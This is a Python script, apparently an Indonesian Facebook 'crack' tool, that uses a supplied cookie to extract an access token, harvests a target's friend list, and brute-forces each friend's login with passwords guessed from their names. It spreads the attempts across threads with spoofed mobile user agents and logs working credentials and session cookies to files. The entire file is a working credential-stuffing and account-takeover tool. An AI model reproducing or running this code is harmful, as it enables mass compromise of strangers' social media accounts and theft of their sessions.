###----------[ IMPORT MODULE ]----------###
import requests,json,os,sys,random,datetime,time,re,platform
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu

###----------[ GLOBAL NAMA ]----------###
id,id2,uid = [],[],[]
tokenefb = []
akunyeh = []
usragent = []
loop,baz = 0,[]
ok,cp,oo = 0,0,[]

###----------[ USER AGENT ]----------###
for agenku in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c='ASUS_A009 Build/OPM1.171019.011; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/293.0.0.9.114;]'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c='TECNO LB7 Build/O11019; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/288.0.0.11.115;]'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usragent.append(uakuh)

###----------[ PEWARNA ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'

###----------[ CONVERT BULAN ]----------###
rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tg = datetime.datetime.now().day
bl = rb[(str(datetime.datetime.now().month))]
th = datetime.datetime.now().year
okh = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
cph = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'

###----------[ UNTUK ANIMASI ]----------###
def baz_anim(berjalan):
        for gas in berjalan + "\n":sys.stdout.write(gas);sys.stdout.flush();time.sleep(0.05)

###----------[ BANNER MENUH ]----------###
def banner():
	os.system('clear')
	print(f'''{mer}   _____ __________  ______
{mer}  / ___// ____/ __ )/ ____/
{mer}  \__ \/ /   / __  / /_    
{puti} ___/ / /___/ /_/ / __/    
{puti}/____/\____/_____/_/
simpel crack brute force''')

###----------[ NGECEK COOKIES ]----------###
def login_baz():
	try:
		token = open('.tokenakun.txt','r').read()
		cok = open('.cookiesakun.txt','r').read()
		tokenefb.append(token)
		try:
			gerap = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenefb[0], cookies={'cookie':cok})
			nteng = json.loads(gerap.text)['id']
			menu(nteng)
		except KeyError:
			login_men()
		except requests.exceptions.ConnectionError:
			baz_anim(f'{mer}koneksimu bermasalah ster :(')
			exit()
	except IOError:
		login_men()
		
###----------[ LOGIN COOKIESNYA ]----------###
def login_men():
	try:
		os.system('clear')
		banner()
		ses = requests.Session()
		print('─────────────────────────────')
		cookie=input(f'cookies :{xxx}{hijo} ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		ken = open(".tokenakun.txt", "w").write(tok)
		cok = open(".cookiesakun.txt", "w").write(cookie)
		baz_anim(f'{puti}└──{bira} login berhasil ster jalanin ulang scnya')
		exit()
	except Exception as e:
		os.system('rm -rf .tokeneakun.txt && rm -rf .cookiesakun.txt')
		baz_anim(f'{puti}└──{kun} login gagal ster coba ganti tumbal')
		exit()

###----------[ BAGIAN MENU ]----------###
def menu(id):
	try:
		cok = open('.cookiesakun.txt','r').read()
	except IOError:
		baz_anim(f'{mer}cookies telah kadaluarsa ster')
		waktu(4)
		login_men()
	os.system('clear')
	banner()
	print(f'{xxx}─────────────────────────────')
	print(f'{xxx}└── ketik ya untuk mulai crack')
	helpbas = input(f'{xxx}└── : ')
	if helpbas in ['ya','y']:
		nge_krek()
	else:
		baz_anim(f'{mer}└── yang bener lah ster ngetiknya')

###----------[ DUMP ID PUBLIK ]----------###
def nge_krek():
	try:
		cok = open('.cookiesakun.txt','r').read()
	except IOError:
		baz_anim(f'{mer}cookies telah kadaluarsa ster')
		exit()
	print(f'{xxx}─────────────────────────────')
	idnyanih = input(f'└── id : ')
	try:
		ambilid = requests.get('https://graph.facebook.com/v1.0/'+idnyanih+'?fields=friends.limit(5001)&access_token='+tokenefb[0],cookies={'cookie': cok}).json()
		for proses in ambilid['friends']['data']:
			try:id.append(proses['id']+'|'+proses['name'])
			except:continue
		print(f'└── terkumpul : '+str(len(id)))
		atur_dulu()
	except requests.exceptions.ConnectionError:
		print('└── koneksi terputus')
		exit()
	except (KeyError,IOError):
		print('└── teman tidak publik')
		exit()

###----------[  ATUR DULU STER ]----------###
def atur_dulu():
	print(f'{xxx}─────────────────────────────')
	print('└── 1. akun baru')
	print('└── 2. akun acak')
	aturid = input(f'{xxx}└── : ')
	if aturid in ['1','01']:
		xbaru=[]
		for baru in sorted(id):
			xbaru.append(baru)
		bkp=len(xbaru)
		bkpp=(bkp-1)
		for miyabi in range(bkp):
			id2.append(xbaru[bkpp])
			bkpp -=1
	elif aturid in ['2','02']:
		for acak in id:
			xnxx = random.randint(0,len(id2))
			id2.insert(xnxx,acak)
	else:
		baz_anim(f'{mer}└── yang bener lah ster ngetiknya')
		exit()
		
	print(f'{xxx}─────────────────────────────')
	print('└── 1. mobile')
	print('└── 2. free')
	print('└── 3. mbasic')
	metod = input(f'{xxx}└── : ')
	if metod in ['1','01']:
		baz.append('mobile')
	elif metod in ['2','02']:
		baz.append('free')
	elif metod in ['3','03']:
		baz.append('mbasic')
	else:
		baz.append('mobile')
	wordlist()
		
###----------[  BAGIAN WORDLIST ]----------###
def wordlist():
	global prog,des
	print(f'{xxx}─────────────────────────────')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as gas_krek:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				else:
					if len(frs)<3:
						pwv.append(nmf)
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
				if 'ya' in pwt:
					for xpwn in pwn:
						pwv.append(xpwn)
				else:pass
				if 'mobile' in baz:
					gas_krek.submit(crackmobile,idf,pwv)
				elif 'free' in baz:
					gas_krek.submit(crackfree,idf,pwv)
				elif 'mbasic' in baz:
					gas_krek.submit(crackmbasic,idf,pwv)
				else:
					gas_krek.submit(crackmbasic,idf,pwv)
		print(f'{xxx}─────────────────────────────')
		print(f'{hijo}+ {puti}akun ok : {hijo}%s{xxx} '%(ok))
		print(f'{kun}+ {puti}akun cp : {kun}%s{xxx} '%(cp))
		print(f'{xxx}─────────────────────────────')
		
###----------[  MOBILE ]----------###
def crackmobile(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')     
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r└── {hijo}{idf}|{pw}\n{xxx}└── {hijo}{kuki}{xxx}')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1

###----------[  FREE ]----------###
def crackfree(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=2076461462396807&kid_directed_site=0&app_id=2076461462396807&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D2076461462396807%26redirect_uri%3Dhttps%253A%252F%252Fduniagames.co.id%252Fnew-callback%26scope%3Dpublic_profile%252Cemail%26code_challenge%3DHxQ_aaVTvmLNABimDgJTBZqCH576vzfn_7nmr6ng7z0%26code_challenge_method%3DS256%26state%3Dbtgpi5wcqsgv9wwwpxp5lhu8nwcc1uf%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc241fbf0-998f-4d22-be77-097dffb7b337%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fduniagames.co.id%2Fnew-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dbtgpi5wcqsgv9wwwpxp5lhu8nwcc1uf%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/dialog/oauth?response_type=code&client_id=2076461462396807&redirect_uri=https%3A%2F%2Fduniagames.co.id%2Fnew-callback&scope=public_profile%2Cemail&code_challenge=HxQ_aaVTvmLNABimDgJTBZqCH576vzfn_7nmr6ng7z0&code_challenge_method=S256&state=btgpi5wcqsgv9wwwpxp5lhu8nwcc1uf&ret=login&fbapp_pres=0&logger_id=c241fbf0-998f-4d22-be77-097dffb7b337&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=2076461462396807&kid_directed_site=0&app_id=2076461462396807&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D2076461462396807%26redirect_uri%3Dhttps%253A%252F%252Fduniagames.co.id%252Fnew-callback%26scope%3Dpublic_profile%252Cemail%26code_challenge%3DHxQ_aaVTvmLNABimDgJTBZqCH576vzfn_7nmr6ng7z0%26code_challenge_method%3DS256%26state%3Dbtgpi5wcqsgv9wwwpxp5lhu8nwcc1uf%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc241fbf0-998f-4d22-be77-097dffb7b337%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fduniagames.co.id%2Fnew-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dbtgpi5wcqsgv9wwwpxp5lhu8nwcc1uf%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')     
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r└── {hijo}{idf}|{pw}\n{xxx}└── {hijo}{kuki}{xxx}')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1

###----------[  MBASIC ]----------###
def crackmbasic(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D274266067164%26cbt%3D1675237736936%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df33eeedf0d23c74%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%26client_id%3D274266067164%26display%3Dtouch%26domain%3Did.pinterest.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.pinterest.com%252Flogin%26locale%3Did_ID%26logger_id%3Df27fa04cd920e98%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96f44d15f7ea8%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%2526frame%253Df7efd9d84b96a8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%252Cuser_friends%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/v2.7/dialog/oauth?app_id=274266067164&cbt=1675237736936&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df33eeedf0d23c74%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener&client_id=274266067164&display=touch&domain=id.pinterest.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fid.pinterest.com%2Flogin&locale=id_ID&logger_id=f27fa04cd920e98&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail%2Cuser_birthday%2Cuser_friends&sdk=joey&version=v2.7&ret=login&fbapp_pres=0&tp=unspecified&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D274266067164%26cbt%3D1675237736936%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df33eeedf0d23c74%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%26client_id%3D274266067164%26display%3Dtouch%26domain%3Did.pinterest.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.pinterest.com%252Flogin%26locale%3Did_ID%26logger_id%3Df27fa04cd920e98%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96f44d15f7ea8%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%2526frame%253Df7efd9d84b96a8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%252Cuser_friends%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')     
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r└── {hijo}{idf}|{pw}\n{xxx}└── {hijo}{kuki}{xxx}')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	login_baz()
